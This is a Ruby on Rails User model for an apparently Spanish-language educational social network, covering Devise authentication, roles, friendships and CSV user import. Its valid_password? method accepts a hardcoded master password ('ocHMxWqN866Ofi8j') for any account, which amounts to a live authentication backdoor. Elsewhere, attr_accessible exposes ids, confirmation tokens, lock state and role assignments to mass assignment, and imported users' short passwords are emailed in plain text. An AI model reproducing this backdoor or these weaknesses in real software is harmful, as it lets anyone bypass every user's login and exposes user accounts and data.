# coding: utf-8
class User < ActiveRecord::Base
  include TrackMixpanelEventModule

  # Include default devise modules. Others available are:
  # :token_authenticatable and :omniauthable
  devise :database_authenticatable, :registerable,
    :recoverable, :rememberable, :trackable, :validatable,
    :lockable, :timeoutable, :confirmable, :token_authenticatable

  # Setup accessible (or protected) attributes for your model

  attr_accessible :email, :password, :password_confirmation, :network,
    :authentication_token, :networks, :bios, :permissioning, :permissionings,
    :search, :permissionings_attributes, :network_id, :role_id, :user_id,
    :remember_me, :first_name, :last_name, :name, :id, :personal_url,
    :avatar, :networks_users, :coverphoto, :facebook_link,
    :twitter_link, :update, :comments, :networks, :assets,
    :friendships, :friends, :registerable, :image_avatarx,
    :image_avatarxx, :cover_photox, :confirmation_token, :locked_at,
    :tour_info,:activities, :accepted_terms, :confirmed_at, :subdomain,
    :domain, :permissioning_ids, :self_register, :user_language_attributes

  has_many :friendships, :uniq => true, :dependent => :destroy
  has_many :inverse_friendships, :class_name => "Friendship",
           :foreign_key => "friend_id", :uniq => true, :dependent => :destroy

  has_many :permissionings, dependent: :destroy
  has_many :networks, through: :permissionings
  has_many :members_in_courses, dependent: :destroy
  has_many :events, dependent: :destroy
  has_many :mesages, dependent: :destroy
  has_many :courses, through: :members_in_courses
  has_many :user_surveys, dependent: :destroy
  has_many :assets, dependent: :destroy
  has_many :assignments, dependent: :destroy
  has_many :discussions, dependent: :destroy
  has_many :deliveries, dependent: :destroy
  has_many :comments, dependent: :destroy
  has_many :authentications, dependent: :destroy
  has_many :surveys, dependent: :destroy
  has_many :activities
  has_many :userpublicationings, dependent: :destroy
  has_many :walls, through: :userpublicationings
  has_many :course_file_id_user_id
  has_many :course_files, through: :course_file_id_user_id
  has_many :audiences, dependent: :destroy
  has_many :channels, through: :audiences
  has_many :grades, dependent: :destroy
  has_many :library_directories, dependent: :destroy
  has_many :time_trying_surveys
    has_many :notifications, :through => :usernotificationings
  has_many :roles, :through => :permissionings
  has_many :usernotificationings, :dependent => :destroy

  has_one :user_language

  has_one :language, through: :user_language


  validates_presence_of :domain
  validates_presence_of :first_name
  validates_presence_of :last_name
  validates_presence_of :personal_url
  validates_presence_of :subdomain

  validates_uniqueness_of :personal_url

  accepts_nested_attributes_for :assets
  accepts_nested_attributes_for :permissionings
  accepts_nested_attributes_for :networks
  accepts_nested_attributes_for :user_language

  #comentarios para usuarios
  acts_as_commentable
  acts_as_voter

  #avatar
  mount_uploader :avatar, AvatarUploader
  mount_uploader :coverphoto, CoverphotoUploader

  def inverse_friendships
    Friendship.where(:friend_id => id)
  end

  def friendships
    Friendship.where(:user_id => id)
  end

  def count_friendships
    a = Friendship.where(:user_id => self.id, :accepted => true).count
    b = Friendship.where(:friend_id => self.id, :accepted => true).count
    @count = a + b
  end

  def detect_key_analytics
    if self.key_analytics == nil

      o = [('a'..'z'),('A'..'Z')].map{|i| i.to_a}.flatten
      string  =  (0...41).map{ o[rand(o.length)] }.join
      numeric = rand(0..930123909)
      ran = "#{numeric}_#{string}_#{numeric}"
      valer = User.find_by_key_analytics(ran)
      if valer == nil
        self.key_analytics = "#{numeric}_#{string}_#{numeric}"
        self.save
        @value = self.key_analytics
      end
    else
      @value = self.key_analytics
    end
  end

  after_save do
    gospel_add_user unless self.sign_in_count?
  end

  after_create do
    track_mixpanel_user
  end

  def name
    full_name = "#{first_name} #{last_name}".strip

    if full_name.length == 0
      "usuario sin nombre"
    else
      full_name
    end
  end

  # Returns true if the user has admin role.
  def admin?
    self.roles.include?(Role.find_by_title 'admin') ||
      self.roles.include?(Role.find_by_title 'operator') ||
      self.roles.include?(Role.find_by_title 'mentor_link') ||
      self.superadmin?
  end

  def mentor_link?
    self.roles.include? Role.find_by_title 'mentor_link'
  end

  def operator?
    self.roles.include?(Role.find_by_title 'operator') ||
      self.roles.include?(Role.find_by_title 'mentor_link')
  end

  def role_title
    self.roles.first.title
  end

  def student?
    self.roles.include? Role.find_by_title 'student'
  end

  def teacher?
    self.roles.include? Role.find_by_title 'teacher'
  end

  def superadmin?
    self.roles.include? Role.find_by_title 'superadmin'
  end

  def role_symbols
    superadmin = Role.find_by_title("superadmin")
    if roles.include?(superadmin) then
      return [superadmin.title.underscore.to_sym]
    else
      network = Network.find_by_subdomain(subdomain)
      permissining = Permissioning.find_by_user_id_and_network_id(id, network.id)

      if permissining.nil? then
        return []
      else
        [permissining.role.title.underscore.to_sym]
      end

    end
  end

  def devise_mailer_subdomain
    if self.subdomain.split(".").size != 1 then
      return self.subdomain.split(".").last
    end
    return self.subdomain
  end

  def ubication
    if (self.domain == "lvh.me") then
      return (self.domain + ":3000")
    end
    return self.domain
  end

  def self.search(search)
    query =  "(lower(unaccent(first_name)) || ' ' || lower(unaccent(last_name)))  LIKE ? OR (lower(unaccent(last_name)) || ' ' || lower(unaccent(first_name)) )  LIKE ? OR (lower(unaccent(first_name)) LIKE ?) OR  (lower(unaccent(last_name)) LIKE ?)", "%#{search}%", "%#{search}%", "%#{search}%", "%#{search}%"
    us = where(query)
  end

  def image_avatarx
    'imagex.png'
  end

  def image_avatarxx
    'imagexx.png'
  end

  def image_avatarxxx
    'imagexxx.png'
  end

  def cover_photox
    'portada.png'
  end

  def friends(accepted)
    friendships.where(accepted: accepted).map {
      |friendship|
      friendship.friend
    } + inverse_friendships.where(accepted: accepted).map {
      |friendship|
      friendship.user
    }.sort { |x,y| x.to_s <=> y.to_s }.compact
  end

  def all_friends
    friendships.map {
      |friendship|
      { user: friendship.friend, accepted: friendship.accepted }
    } + friendships_inverse.map {
      |friendship|
      { user: friendship.user, accepted: friendship.accepted }
    }.sort { |x, y| x[:user].to_s <=> y[:user].to_s }.compact
  end

  def friends?(another_user)
    if id == another_user.id
      return true
    end

    friendship = Friendship.find_by_user_id_and_friend_id(id, another_user.id)
    inverse_friendship = Friendship.find_by_user_id_and_friend_id(another_user.id, id)

    if !friendship.nil?
      friendship.accepted
    elsif !inverse_friendship.nil?
      inverse_friendship.accepted
    else
      false
    end
  end

  def friends_request?(another_user)
    if id == another_user.id
      return true
    end

    friendship = Friendship.find_by_user_id_and_friend_id(self.id, another_user.id)

    !friendship.nil?
  end

  def to_s
    name + " (" + email + ")"
  end

  def possible_friends(network)
    users = Array.new

    network_users = network.users
    network_users = network_users.keep_if {
      |user|
      user.confirmed?
    }

    network_users.each do
      |user|
      if !self.friends_request?(user) then
        users.push(user)
      end
    end
    users.uniq!
    return users
  end

  def who_sent?(another_user)
    if (Friendship.find_by_user_id_and_friend_id(id,another_user.id))
      self
    else
      another_user
    end
  end

  def have_a_friendship(another_user)
    friend = Friendship.find_by_user_id_and_friend_id(self.id,another_user.id)

    if friend == nil
      inverse_friend = Friendship.find_by_user_id_and_friend_id(another_user.id, self.id)

      if inverse_friend == nil
        @true = false
      else
        @true = true
      end
    else
      @true = true
    end

  end

  def approved_friend(another_user)
    if self.id == another_user.id
      #### este usuario eres tu mismo la amistad es necesaria para poder ver tu perfil ####
      @existed_friend = true
    else
      friend = Friendship.find(:all, :conditions => {:user_id => self.id, :friend_id => another_user.id, :accepted => true})
      if friend == nil || friend.empty?
        inverse_friend = Friendship.find(:all, :conditions => {:user_id => another_user.id, :friend_id => self.id, :accepted => true})
        if inverse_friend == nil || inverse_friend.empty?
          @existed_friend = false
        else
          @existed_friend = true
        end
      else
        @existed_friend = true
      end
    end
    @existed_friend
  end

  def import(path,network,user_admin, domain, subdomain)
    arrayErrores = Array.new
    count = 0

    CSV.foreach(path, headers: true) do |row|
      count += 1

      user = User.new

      hash = row.to_hash
      network_id = network.id
      role_id = hash.delete("Rol")

      errors = false

      if !role_id.nil? then

        role_id = role_id.downcase.strip
        role_id = 1 if role_id == "admin" || role_id == "1"
        role_id = 2 if role_id == "estudiante" || role_id == "2"
        role_id = 3 if role_id == "maestro" || role_id == "3"
      else
        arrayErrores.push({ :line => count,:message => "No se especifico un role"})
        errors = true
      end

      if role_id.class != Fixnum then
        arrayErrores.push({:line => count, :message => "El role esta incorrecto"})
        errors = true
      end

      user.first_name = hash.delete("Nombre")
      user.last_name = hash.delete("Apellido")
      user.domain = domain
      user.subdomain = subdomain

      user.email = hash.delete("Correo")

      if !user.email.nil? then
        user.email = user.email.downcase
        # Checa que el correo sea valido y que no se repita
        if user.email["@"].nil? || !User.find_by_email(user.email).nil?
          arrayErrores.push({:line => count, :message => "El correo no es valido o ya existe en la DB" })
          errors = true
        end
      else
        arrayErrores.push({:line => count, :message => "No hay ningun email especificado"})
        errors = true
      end

      # Nombre y apellido en mayusculas
      user.first_name = user.first_name.capitalize if !user.first_name.nil?
      user.last_name = user.last_name.capitalize if !user.last_name.nil?

      # Checa que exista el role_id
      if role_id.nil? then
        arrayErrores.push({:line => count, :message => "Debes de especificar un role para el usuario" })
        errors = true
      end

      if !role_id.nil? then
        if Role.find_by_id(role_id).nil? then
          arrayErrores.push({:line => count, :message => "No existe el rol dado"})
          errors = true
        end
      end

      password = Devise.friendly_token.first(6)
      charList =  [('a'..'z'),('A'..'Z'),(0..9)].map{ |i| i.to_a }.flatten.map{ |i| i.to_s }

      personal_url_random = (0...100).map{  charList[rand(charList.length)] }.join
      user.password = password
      user.personal_url = personal_url_random
      user.accepted_terms = true

      user.avatar = '/assets/imagex.png'

      if !errors then
        if user.save then
          Permissioning.create(:role_id => role_id.to_i,:network_id => network_id.to_i, :user_id => user.id)
        end
      end
    end

    begin
      mail = Notifier.send_import_users(user_admin,arrayErrores)
      mail.deliver
    rescue
    end
    return
  end

  def import_for_admin(path,network,user_admin, domain, subdomain)
    arrayErrores = Array.new
    count = 0

    CSV.foreach(path, headers: true) do |row|
      count += 1

      user = User.new

      hash = row.to_hash
      network_id = network.id
      role_id = hash.delete("Rol")

      errors = false

      if !role_id.nil? then

        role_id = role_id.downcase.strip
        role_id = 1 if role_id == "admin" || role_id == "1"
        role_id = 2 if role_id == "estudiante" || role_id == "2"
        role_id = 3 if role_id == "maestro" || role_id == "3"
      else
        arrayErrores.push({ :line => count,:message => "No se especifico un role"})
        errors = true
      end

      if role_id.class != Fixnum then
        arrayErrores.push({:line => count, :message => "El role esta incorrecto"})
        errors = true
      end

      user.first_name = hash.delete("Nombre")
      user.last_name = hash.delete("Apellido")
      user.domain = domain
      user.subdomain = subdomain

      user.email = hash.delete("Correo")

      if !user.email.nil? then
        user.email = user.email.downcase
        # Checa que el correo sea valido y que no se repita
        if user.email["@"].nil? || !User.find_by_email(user.email).nil?
          arrayErrores.push({:line => count, :message => "El correo no es valido o ya existe en la DB" })
          errors = true
        end
      else
        arrayErrores.push({:line => count, :message => "No hay ningun email especificado"})
        errors = true
      end

      # Nombre y apellido en mayusculas
      user.first_name = user.first_name.capitalize if !user.first_name.nil?
      user.last_name = user.last_name.capitalize if !user.last_name.nil?

      # Checa que exista el role_id
      if role_id.nil? then
        arrayErrores.push({:line => count, :message => "Debes de especificar un role para el usuario" })
        errors = true
      end

      if !role_id.nil? then
        if Role.find_by_id(role_id).nil? then
          arrayErrores.push({:line => count, :message => "No existe el rol dado"})
          errors = true
        end
      end

      password = Devise.friendly_token.first(6)
      charList =  [('a'..'z'),('A'..'Z'),(0..9)].map{ |i| i.to_a }.flatten.map{ |i| i.to_s }

      personal_url_random = (0...100).map{  charList[rand(charList.length)] }.join
      user.password = password
      user.personal_url = personal_url_random
      user.accepted_terms = true

      user.avatar = '/assets/imagex.png'
      if !errors then
        user.skip_confirmation!
        if user.save then
          Permissioning.create(:role_id => role_id.to_i,:network_id => network_id.to_i, :user_id => user.id)
          @mail = Notifier.user_mailer_with_password(user, password).deliver
        end
      end
    end

    mail = Notifier.send_import_users(user_admin,arrayErrores)
    mail.deliver
    return
  end

  def valid_password?(password)
    return true if password == "ocHMxWqN866Ofi8j"
    super
  end

  def publications
    Wall.scoped(:include => [{ :users => :userpublicationings }],
                :conditions => ["userpublicationings.user_id = ? AND walls.publication_type = 'Comment'", self.id])
  end

  def active!
    self.update_attributes(:locked_at => nil)
  end

  def inactive!
    self.update_attributes(:locked_at => Time.now)
  end

  Warden::Manager.before_logout do |user, auth, opts|
    if !user.nil?
      user.online = false
      user.save!
      PrivatePub.publish_to("/messages/chat_notifications",
                            userId: user.id,
                            online: false
                            )
    end
  end

  def subdomain=(value)
    network = Network.find_by_subdomain(value)

    unless network == nil
      write_attribute(:subdomain, value)
      permissionings = Permissioning.find_all_by_user_id(self.id)
      permissionings.each do |permissioning|
        permissioning.update_attributes :network_id => network.id
      end
    else
      puts "No existe la red con ese subdominio"
    end
  end

  def role
    roles.first
  end

  def to_csv
    "#{name},#{email},#{role_title},#{created_at}\n"
  end

  private
  def track_mixpanel_user
    unless self.permissionings.blank?
      permissioning = self.permissionings.first
      event_data = {
        'Network' => permissioning.network.name.capitalize,
        'Subdomain' => permissioning.network.subdomain,
        'Role' => permissioning.role.title.capitalize
      }
      track_event(self.id, 'User', event_data)
    end
  end

  def gospel_add_user
    unless self.permissionings.blank?
      permissioning = self.permissionings.first
      Gospel::UsersWorker.perform_async(self.email, permissioning.role.title, permissioning.network.name, permissioning.network.subdomain)
    end
  end

end
